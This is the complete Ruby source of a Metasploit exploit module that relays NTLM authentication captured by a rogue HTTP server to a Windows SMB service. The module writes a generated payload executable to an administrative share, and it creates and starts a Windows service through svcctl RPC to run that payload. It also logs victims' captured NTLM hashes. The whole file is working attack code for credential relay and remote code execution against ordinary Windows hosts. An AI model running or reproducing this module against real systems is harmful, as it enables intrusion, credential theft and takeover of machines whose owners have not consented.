##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/constants'
require 'rex/proto/ntlm/message'
require 'rex/proto/ntlm/crypt'
require 'rex/exceptions'
require 'ruby_smb'


NTLM_CONST = Rex::Proto::NTLM::Constants
NTLM_CRYPT = Rex::Proto::NTLM::Crypt
MESSAGE = Rex::Proto::NTLM::Message

class MetasploitModule < Msf::Exploit
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::EXE

  # Aliases for common classes
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants
  NDR = Rex::Encoder::NDR

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Http NTLM Relay/Reflection',
      'Description' => %q{
          This module bases on http_ntlmrelay.rb.
          It starts an http server and handles all ntlm-over-http processes 
          and forwards Net-NTLM credentials to the SMB service.
        },
      'Author'      =>
        [
          'exist@SycloverSecurity',
          'Rich Lundeen <richard.lundeen[at]gmail.com>'
        ],
      'License'     => MSF_LICENSE,
      'Arch'           => [ARCH_X86, ARCH_X64],
      'Platform'       => 'win',
      'Targets'        =>
                          [
                              [ 'Automatic', { } ],
                          ],
      'Actions'     =>
        [
          [ 'WebServer' ]
        ],
      'PassiveActions' =>
        [
          'WebServer'
        ],
      'DefaultAction'  => 'WebServer'))

    register_options([
      OptBool.new('RSSL', [true, "SSL on the remote connection ", false]),
      OptEnum.new('RTYPE', [true, "Type of action to perform on remote target", "smb_autopwn",
        [ "smb_autopwn" ]]),
      OptString.new('SMB_VERSION', [false, "Smb version on remote target, only support 1 and 2(set smb_version 1/2) "]),
      OptString.new('RURIPATH', [true, "The path to relay credentials ", "c$\\windows"]),
      OptString.new('HOSTNAME', [false, "The host name of the target machine "]),
      OptPath.new('FILE', [false, "specified by a local file as service" ]),
    ])

    register_advanced_options([
      OptPath.new('RESPPAGE', [false,
        'The file used for the server response. (Image extensions matter)', nil]),
      OptPath.new('HTTP_HEADERFILE', [false,
        'File specifying extra HTTP_* headers (cookies, multipart, etc.)', nil]),
      OptString.new('SMB_SHARES', [false, 'The shares to check with SMB_ENUM',
              'IPC$,ADMIN$,C$,D$,CCMLOGS$,ccmsetup$,share,netlogon,sysvol'])
    ])

    deregister_options('DOMAIN', 'NTLM::SendLM', 'NTLM::SendSPN', 'NTLM::SendNTLM', 'NTLM::UseLMKey',
      'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2')
  end

  # Handles the initial requests waiting for the browser to try NTLM auth
  def on_request_uri(cli, request)

    case request.method
    when 'OPTIONS'
      process_options(cli, request)
    else
      cli.keepalive = true;

      # If the host has not started auth, send 401 authenticate with only the NTLM option
      if(!request.headers['Authorization'])
        response = create_response(401, "Unauthorized")
        response.headers['WWW-Authenticate'] = "NTLM"
        response.headers['Proxy-Support'] = 'Session-Based-Authentication'

        response.body =
          "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"

        cli.send_response(response)
        return false
      end
      method,hash = request.headers['Authorization'].split(/\s+/,2)
      # If the method isn't NTLM something odd is goign on.
      # Regardless, this won't get what we want, 404 them
      if(method != "NTLM")
        print_status("Unrecognized Authorization header, responding with 404")
        send_not_found(cli)
        return false
      end

      print_status("NTLM Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")


      handle_relay(cli,hash)
    end
  end

  def run
    parse_args()
    exploit()
  end

  def process_options(cli, request)
    print_status("OPTIONS #{request.uri}")
    headers = {
      'MS-Author-Via' => 'DAV',
      'DASL'          => '<DAV:sql>',
      'DAV'           => '1, 2',
      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
      'Cache-Control' => 'private'
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  # The call to handle_relay should be a victim HTTP type 1 request
  def handle_relay(cli_sock, hash)
    print_status("Beginning NTLM Relay...")
    message = Rex::Text.decode_base64(hash)
    # get type of message, which will be HTTP, SMB, ...
    protocol = datastore['RTYPE'].split('_')[0]
    if(message[8,1] != "\x03")
      # Relay NTLMSSP_NETOTIATE from client to server (type 1)
      
      @host = parse_host(hash)
      case protocol
        when 'http'
          resp, ser_sock = http_relay_toserver(hash)
          if resp.headers["WWW-Authenticate"]
            t2hash = resp.headers["WWW-Authenticate"].split(" ")[1]
          else
            print_error "#{rhost} is not requesting authentication."
            cli_sock.close
            ser_sock.close
            return false
          end
        when 'smb'
          if datastore['SMB_VERSION'].nil?
            res = check_smb_version
            if res.first == 'unknown'
              print_error "Unknown smb version, currently only supports SMBv1 and SMBv2"
              return false
            else
              @smb_version = res.first.delete("SMB")
            end
          else
              @smb_version = datastore['SMB_VERSION']
          end

          t2hash, ser_sock = smb_relay_toservert1(hash)
      end
      # goes along with above, resp is now just the hash
      client_respheader = "NTLM " << t2hash

      # Relay NTLMSSP_CHALLENGE from server to client (type 2)
      response = create_response(401, "Unauthorized")
      response.headers['WWW-Authenticate'] = client_respheader
      response.headers['Proxy-Support'] = 'Session-Based-Authentication'

      response.body =
        "<HTML><HEAD><TITLE>You are not authorized to view this page</TITLE></HEAD></HTML>"

      cli_sock.send_response(response)

      # Get the type 3 hash from the client and relay to the server
      cli_type3Data = cli_sock.get_once(-1, 5)
      begin
        cli_type3Header = cli_type3Data.split(/\r\nAuthorization:\s+NTLM\s+/,2)[1]
        cli_type3Hash = cli_type3Header.split(/\r\n/,2)[0]
      rescue ::NoMethodError
        print_error("Error: Type3 hash not relayed.")
        cli_sock.close()
        return false
      end

      case protocol
        when 'smb'
          ser_sock = smb_relay_toservert3(cli_type3Hash, ser_sock)
          # perform authenticated action
          action = datastore['RTYPE']
          case action
            when 'smb_autopwn'
              resp = send "smb#{@smb_version}_autopwn", ser_sock, cli_sock
          end
      end
      report_info(resp, cli_type3Hash)

      # close the client socket
      response = set_cli_200resp()
      cli_sock.send_response(response)
      cli_sock.close()


      return
    else
      print_error("Error: Bad NTLM sent from victim browser")
      cli_sock.close()
      return false
    end
  end

  def parse_args()
    # Consolidate the PUTDATA and FILEPUTDATA options into FINALPUTDATA
    if datastore['PUTDATA'] != nil and datastore['FILEPUTDATA'] != nil
      print_error("PUTDATA and FILEPUTDATA cannot both contain data")
      raise ArgumentError
    elsif datastore['PUTDATA'] != nil
      @finalputdata = datastore['PUTDATA']
    elsif datastore['FILEPUTDATA'] != nil
      f = File.open(datastore['FILEPUTDATA'], "rb")
      @finalputdata = f.read
      f.close
    end

    if (not framework.db.active) and (not datastore['VERBOSE'])
      print_error("No database configured and verbose disabled, info may be lost. Continuing")
    end
  end

  # sync_options dynamically changes the arguments of a running attack
  # this is useful for multi staged relay attacks
  # ideally I would use a resource file but it's not easily exposed, and this is simpler

  # relay creds to server and perform any HTTP specific attacks
  def http_relay_toserver(hash, ser_sock = nil)
    timeout = 20
    type3 = (ser_sock == nil ? false : true)

    method = datastore['RTYPE'].split('_')[1]
    theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
          "Connection: Keep-Alive\r\n" )

    # HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
    if datastore['HTTP_HEADERFILE'] != nil
      print_status("Including extra headers from: #{datastore['HTTP_HEADERFILE']}")
      # previous request might create the file, so error thrown at runtime
      if not ::File.readable?(datastore['HTTP_HEADERFILE'])
        print_error("HTTP_HEADERFILE unreadable, aborting")
        raise ArgumentError
      end
      # read file line by line to deal with any dos/unix ending ambiguity
      File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
        next if header.strip == ''
        theaders << (header) << "\r\n"
      end
    end

    opts = {
    'uri'     => normalize_uri(datastore['RURIPATH']),
    'method'  => method,
    'version' => '1.1',
    }
    if (@finalputdata != nil)
      # we need to get rid of an extra "\r\n"
      theaders = theaders[0..-3]
      opts['data'] = @finalputdata << "\r\n\r\n"
    end
    opts['SSL'] = true if datastore["RSSL"]
    opts['raw_headers'] = theaders

    ser_sock = connect(opts) if !type3

    r = ser_sock.request_raw(opts)
    resp = ser_sock.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout, true)

    # Type3 processing
    if type3
      # check if auth was successful
      if resp.code == 401
        print_error("Auth not successful, returned a 401")
      else
        print_good("Auth successful, saving server response in database")
      end
      vprint_status(resp.to_s)
    end
    return [resp, ser_sock]
  end

  # relay ntlm type1 message for SMB
  def smb_relay_toservert1(hash)
    rsock = Rex::Socket::Tcp.create(
      'PeerHost' => datastore['RHOST'],
      'PeerPort' => datastore['RPORT'],
      'Timeout'  => 3,
      'Context'  =>
        {
          'Msf'       => framework,
          'MsfExploit'=> self,
        }
    )
    if (not rsock)
      print_error("Could not connect to target host (#{target_host})")
      return
    end

    case @smb_version
     when '1'
        ser_sock = Rex::Proto::SMB::SimpleClient.new(rsock, rport == 445 ? true : false, [1])

        if (datastore['RPORT'] == '139')
          ser_sock.client.session_request()
        end
        blob = Rex::Proto::NTLM::Utils.make_ntlmssp_secblob_init('', '', 0x80201)
        ser_sock.client.negotiate(true)
        ser_sock.client.require_signing = false
        resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob, false)
        resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
        # Save the user_ID for future requests
        ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']
     when '2'
        dispatch = RubySMB::Dispatcher::Socket.new(rsock)
        smb2_client = ::RubySMB::Client.new(dispatch, smb1: false, username: '', password: '')
        smb2_client.negotiate()

        # RubySMB::Client::Authentication.smb2_authenticate
        # https://www.rubydoc.info/gems/ruby_smb/RubySMB/Client/Authentication#smb2_authenticate-instance_method
        packet = RubySMB::SMB2::Packet::SessionSetupRequest.new
        packet.set_type1_blob(Rex::Text.decode_base64(hash))
        packet.smb2_header.message_id = 1
        smb2_client.smb2_message_id = 2
        resp = smb2_client.send_recv(packet)
        challenge_packet = smb2_client.smb2_ntlmssp_challenge_packet(resp)
        smb2_client.session_id = challenge_packet.smb2_header.session_id
        secbuffer = challenge_packet.buffer
        # secbuffer contains ntlmssp block and other data, we only need ntlmssp block.
        # This is a rude method that may cause an error parsing.
        ntlmssp = "NTLMSSP" << secbuffer.split("NTLMSSP", 2)[1]
        
        type2 = Net::NTLM::Message.parse(ntlmssp)
        # If "Negotiate 0x00004000" flag is set, client may send null credential(e.g. "\").
        # That may cause the authentication to fail, so we need to clear this flag.
        type2.flag &= 0xFFFF0FFF
        ntlmsspblob = type2.serialize
        ntlmsspencodedblob = Rex::Text.encode_base64(ntlmsspblob)

        return [ntlmsspencodedblob, smb2_client]
    end

    begin
      #lazy ntlmsspblob extraction
      ntlmsspblob = 'NTLMSSP' <<
              (resp.to_s().split('NTLMSSP')[1].split("\x00\x00Win")[0]) <<
              "\x00\x00"
    rescue ::Exception => e
      print_error("Type 2 response not read properly from server")
      raise e
    end
    ntlmsspencodedblob = Rex::Text.encode_base64(ntlmsspblob)
    return [ntlmsspencodedblob, ser_sock]
  end

  # relay ntlm type3 SMB message
  def smb_relay_toservert3(hash, ser_sock)
    # arg = get_hash_info(hash)
    dhash = Rex::Text.decode_base64(hash)

    # Create a GSS blob for ntlmssp type 3 message, encoding the passed hash


    case @smb_version
    when '1'
      blob =
          "\xa1" + Rex::Proto::NTLM::Utils.asn1encode(
              "\x30" + Rex::Proto::NTLM::Utils.asn1encode(
                  "\xa2" + Rex::Proto::NTLM::Utils.asn1encode(
                      "\x04" + Rex::Proto::NTLM::Utils.asn1encode(
                          dhash
                      )
                  )
              )
          )
      resp = ser_sock.client.session_setup_with_ntlmssp_blob(
          blob,
          false,
          ser_sock.client.auth_user_id
        )
      resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)

      # check if auth was successful
      if (resp['Payload']['SMB'].v['ErrorClass'] == 0)
        print_status("SMB auth relay succeeded")
      else
        failure = Rex::Proto::SMB::Exceptions::ErrorCode.new
        failure.word_count = resp['Payload']['SMB'].v['WordCount']
        failure.command = resp['Payload']['SMB'].v['Command']
        failure.error_code = resp['Payload']['SMB'].v['ErrorClass']
        raise failure
      end

    when '2'
      session_id = ser_sock.session_id

      # Net::NTLM::Message.parse returns Type1, Type2 or Type3 class
      message = Net::NTLM::Message.parse(dhash)
      raw = ser_sock.smb2_ntlmssp_authenticate(message, session_id)
      response = ser_sock.smb2_ntlmssp_final_packet(raw)

    end

    return ser_sock
  end

  def smb2_autopwn(ser_sock, cli_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    servicename = rand_text_alpha(8)
    filename = Rex::Text::rand_text_alpha(8) + '.exe'
    share = "\\\\#{@host}\\" + share
    ser_sock.tree_connect(share) 

    fd = ser_sock.open("#{path}\\#{filename}", RubySMB::Dispositions::FILE_OVERWRITE_IF, write: true)

    begin
      exe = ''
      opts = {
          :servicename => servicename
      }
      if datastore['PAYLOAD'].include?(ARCH_X64)
        opts.merge!({ :arch => ARCH_X64 })
      end
      exe = generate_payload_exe_service(opts)
     
      ser_sock.write(fd, 0, exe)
      
    ensure
      ser_sock.close(fd, 1) if fd
    end

    ser_sock.tree_connect("\\\\#{@host}\\IPC$")

    # Just copied the code in the Rex library.
    # I don't know how to use RubySMB library for DCERPC.

    # bind() from https://github.com/rapid7/rex/blob/master/lib/rex/proto/dcerpc/client.rb
    svcpipe = ser_sock.create_pipe("svcctl")
    bind, context = Rex::Proto::DCERPC::Packet.make_bind('367abb81-9844-35f1-ad32-98f038001003', '2.0')
    raise ::Rex::Proto::DCERPC::Exceptions::BindError, 'make_bind failed' if !bind

    ser_sock.write(svcpipe, 0, bind)

    # Read max size. 
    # Must specify the length of the data, otherwise you will receive STATUS_BUFFER_OVERFLOW.
    raw_response = ser_sock.read(svcpipe, 0, 65535)

    response = Rex::Proto::DCERPC::Response.new(raw_response.to_s)

    if response.type == 12 or response.type == 15
      if response.ack_result[context] == 2
        raise ::Rex::Proto::DCERPC::Exceptions::BindError, "Could not bind to handle"
      end
    else
      raise ::Rex::Proto::DCERPC::Exceptions::BindError, "Could not bind to handle"
    end

    @context = context

    stubdata =
    NDR.uwstring("\\\\#{datastore["RHOST"]}") +
        NDR.long(0) +
        NDR.long(0xF003F)
    
    begin
      last_response = call(0x0f, stubdata, ser_sock, svcpipe)
      if (last_response != nil and last_response.stub_data != nil)
        scm_handle = last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Creating a new service")
    print_warning("May need to wait for a while, please be patient")
    displayname = Rex::Text::rand_text_alpha(rand(32)+1)
    svc_handle = nil

    stubdata =
        scm_handle +
            NDR.wstring(servicename) +
            NDR.uwstring(displayname) +
            NDR.long(0x0F01FF) + # Access: MAX
            NDR.long(0x00000110) + # Type: Interactive, Own process
            NDR.long(0x00000003) + # Start: Demand
            NDR.long(0x00000000) + # Errors: Ignore

            NDR.wstring("%SYSTEMROOT%\\" + filename) + # Binary Path
            NDR.long(0) + # LoadOrderGroup
            NDR.long(0) + # Dependencies
            NDR.long(0) + # Service Start
            NDR.long(0) + # Password
            NDR.long(0) + # Password
            NDR.long(0) + # Password
            NDR.long(0)   # Password

    begin
      last_response = call(0x0c, stubdata, ser_sock, svcpipe)
      if (last_response != nil and last_response.stub_data != nil)
        svc_handle = last_response.stub_data[0,20]
        #svc_status = dcerpc.last_response.stub_data[24,4]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Closing service handle...")
    begin
      last_response = call(0x0, svc_handle, ser_sock, svcpipe)
    rescue ::Exception
    end

    print_status("Opening service...")
    begin
      stubdata =
          scm_handle +
              NDR.wstring(servicename) +
              NDR.long(0xF01FF)

      last_response = call(0x10, stubdata, ser_sock, svcpipe)
      if (last_response != nil and last_response.stub_data != nil)
        svc_handle = last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Starting the service...")
    stubdata =
        svc_handle +
            NDR.long(0) +
            NDR.long(0)
    begin
      last_response = call(0x13, stubdata, ser_sock, svcpipe)
      if (last_response != nil and last_response.stub_data != nil)
      end
    rescue ::Exception => e
      return
    end

    print_status("Removing the service...")
    stubdata =
        svc_handle
    begin
      last_response = call(0x02, stubdata, ser_sock, svcpipe)
      if (last_response != nil and last_response.stub_data != nil)
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    print_status("Closing service handle...")
    begin
      last_response = call(0x0, svc_handle, ser_sock, svcpipe)
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    ser_sock.disconnect!
  end

  # gets a specified file from the drive
  def smb1_autopwn(ser_sock, cli_sock)
    share, path = datastore['RURIPATH'].split('\\', 2)
    servicename = rand_text_alpha(8)
    path = path
    filename = Rex::Text::rand_text_alpha(8) + '.exe'
    share = "\\\\#{@host}\\" + share
    ser_sock.client.tree_connect(share)

    fd = ser_sock.open("\\#{path}\\#{filename}", 'rwct')
    begin
      exe = ''
      opts = {
          :servicename => servicename
      }
      if datastore['PAYLOAD'].include?(ARCH_X64)
        opts.merge!({ :arch => ARCH_X64 })
      end
      exe = generate_payload_exe_service(opts)

      fd << exe
    ensure
      fd.close if fd
    end
    
    ser_sock.connect("\\\\#{@host}\\IPC$")
    opts = {
        'Msf' => framework,
        'MsfExploit' => self,
        'smb_pipeio' => 'rw',
        'smb_client' => ser_sock
    }
    uuidv = ['367abb81-9844-35f1-ad32-98f038001003', '2.0']
    handle = Rex::Proto::DCERPC::Handle.new(uuidv, 'ncacn_np', cli_sock.peerhost, ["\\svcctl"])
    dcerpc = Rex::Proto::DCERPC::Client.new(handle, ser_sock.socket, opts)

    print_status("Obtraining a service manager handle...")
    stubdata =
        NDR.uwstring("\\\\#{datastore["RHOST"]}") +
            NDR.long(0) +
            NDR.long(0xF003F)
    begin
      response = dcerpc.call(0x0f, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
        scm_handle = dcerpc.last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Creating a new service")

    displayname = Rex::Text::rand_text_alpha(rand(32)+1)
    svc_handle = nil

    stubdata =
        scm_handle +
            NDR.wstring(servicename) +
            NDR.uwstring(displayname) +
            NDR.long(0x0F01FF) + # Access: MAX
            NDR.long(0x00000110) + # Type: Interactive, Own process
            NDR.long(0x00000003) + # Start: Demand
            NDR.long(0x00000000) + # Errors: Ignore

            NDR.wstring("%SYSTEMROOT%\\" + filename) + # Binary Path
            NDR.long(0) + # LoadOrderGroup
            NDR.long(0) + # Dependencies
            NDR.long(0) + # Service Start
            NDR.long(0) + # Password
            NDR.long(0) + # Password
            NDR.long(0) + # Password
            NDR.long(0)   # Password

    begin
      response = dcerpc.call(0x0c, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
        svc_handle = dcerpc.last_response.stub_data[0,20]
        #svc_status = dcerpc.last_response.stub_data[24,4]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Closing service handle...")
    begin
      response = dcerpc.call(0x0, svc_handle)
    rescue ::Exception
    end

    print_status("Opening service...")
    begin
      stubdata =
          scm_handle +
              NDR.wstring(servicename) +
              NDR.long(0xF01FF)

      response = dcerpc.call(0x10, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
        svc_handle = dcerpc.last_response.stub_data[0,20]
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
      return
    end

    print_status("Starting the service...")
    stubdata =
        svc_handle +
            NDR.long(0) +
            NDR.long(0)
    begin
      response = dcerpc.call(0x13, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
      end
    rescue ::Exception => e
      return
    end

    print_status("Removing the service...")
    stubdata =
        svc_handle
    begin
      response = dcerpc.call(0x02, stubdata)
      if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
      end
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    print_status("Closing service handle...")
    begin
      response = dcerpc.call(0x0, svc_handle)
    rescue ::Exception => e
      print_error("Error: #{e}")
    end

    ser_sock.disconnect("IPC$")

  end

  # print status, and add to the info database
  def report_info(resp, type3_hash)
    data = get_hash_info(type3_hash)

    # no need to generically always grab everything, but grab common config options
    # and the response, some may be set to nil and that's fine
    data[:protocol] = datastore['RTYPE']
    data[:RHOST] = datastore['RHOST']
    data[:RPORT] = datastore['RPORT']
    data[:RURI] = datastore['RURIPATH']
    data[:SYNCID] = datastore['SYNCID']
    data[:Response] = resp

    report_note(
      :host => data[:ip],
      :type => 'ntlm_relay',
      :update => 'unique_data',
      :data => data
    )
  end

  # mostly taken from http_ntlm module handle_auth function
  def get_hash_info(type3_hash)
    # authorization string is base64 encoded message
    domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(type3_hash)
    nt_len = ntlm_hash.length

    if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
      arg = { :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
        :lm_hash => lm_hash,
        :nt_hash => ntlm_hash
      }

      if arg[:lm_hash][16,32] == '0' * 32
        arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
      end
    # if the length of the ntlm response is not 24 then it will be bigger and represent
    # a ntlmv2 response
    elsif nt_len > 48 #lmv2/ntlmv2
      arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
        :lm_hash          => lm_hash[0, 32],
        :lm_cli_challenge => lm_hash[32, 16],
        :nt_hash          => ntlm_hash[0, 32],
        :nt_cli_challenge => ntlm_hash[32, nt_len  - 32]
      }
    elsif nt_len == 0
      print_status("Empty hash from #{host} captured, ignoring ... ")
    else
      print_status("Unknown hash type from #{host}, ignoring ...")
    end

    arg[:host] = host
    arg[:user] = user
    arg[:domain] = domain

    return arg
  end

  # function allowing some basic/common configuration in responses
  def set_cli_200resp()
    response = create_response(200, "OK")
    response.headers['Proxy-Support'] = 'Session-Based-Authentication'

    if (datastore['RESPPAGE'] != nil)
      begin
        respfile = File.open(datastore['RESPPAGE'], "rb")
        response.body = respfile.read
        respfile.close

        type = datastore['RESPPAGE'].split('.')[-1].downcase
        # images can be especially useful (e.g. in email signatures)
        case type
        when 'png', 'gif', 'jpg', 'jpeg'
          print_status('setting content type to image')
          response.headers['Content-Type'] = "image/" << type
        end
      rescue
        print_error("Problem processing respfile. Continuing...")
      end
    end
    if (response.body.empty?)
      response.body = "<HTML><HEAD><TITLE>My Page</TITLE></HEAD></HTML>"
    end
    return response
  end

  def parse_host(pkt)
    if datastore['HOSTNAME']
      return datastore['HOSTNAME']
    end
    #domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(pkt)
    decode = Rex::Text.decode_base64(pkt.strip)
 
    offset = decode[28].unpack("C").first
    length = decode[26].unpack("C").first

    return  decode[offset, length]
  end

  # code from https://github.com/rapid7/rex/blob/master/lib/rex/proto/dcerpc/client.rb
  def call(function, data, ser_sock, fd, do_recv = true)

    frag_size = data.length
    object_id = ''
    call_packets = Rex::Proto::DCERPC::Packet.make_request(function, data, frag_size, @context, object_id)
    call_packets.each { |packet|
      ser_sock.write(fd, 0, packet)
    }
    
    return true if not do_recv

    raw_response = ''

    begin
      # Read max size. 
      # Must specify the length of the data, otherwise you will receive STATUS_BUFFER_OVERFLOW.
      raw_response = ser_sock.read(fd, 0, 65535)
    rescue ::EOFError
      raise Rex::Proto::DCERPC::Exceptions::NoResponse
    end

    if (raw_response == nil or raw_response.length == 0)
      raise Rex::Proto::DCERPC::Exceptions::NoResponse
    end


    last_response = Rex::Proto::DCERPC::Response.new(raw_response)

    if last_response.type == 3
      e = Rex::Proto::DCERPC::Exceptions::Fault.new
      e.fault = last_response.status
      raise e
    end

    last_response
  end

  def check_smb_version
    res = []
    sock = Rex::Socket::Tcp.create(
      'PeerHost' => datastore['RHOST'],
      'PeerPort' => datastore['RPORT'],
      'Timeout'  => 3
    ) 

    dispatch = RubySMB::Dispatcher::Socket.new(sock)
    client = ::RubySMB::Client.new(dispatch, smb1: true, smb2: true, username: '', password: '')


    smb1req = client.smb1_negotiate_request

    recv = client.send_recv(smb1req)
    resp = client.negotiate_response(recv)
    parse_resp = client.parse_negotiate_response(resp)

    if parse_resp.nil?
      res << 'unknown'
    else
      res << parse_resp
    end

    res
  end

  class RubySMB::Client
    def read(file_id, offset = 0, length = last_file.size)
      data = @open_files[file_id].send_recv_read(read_length: length, offset: offset)
    end
  end
end

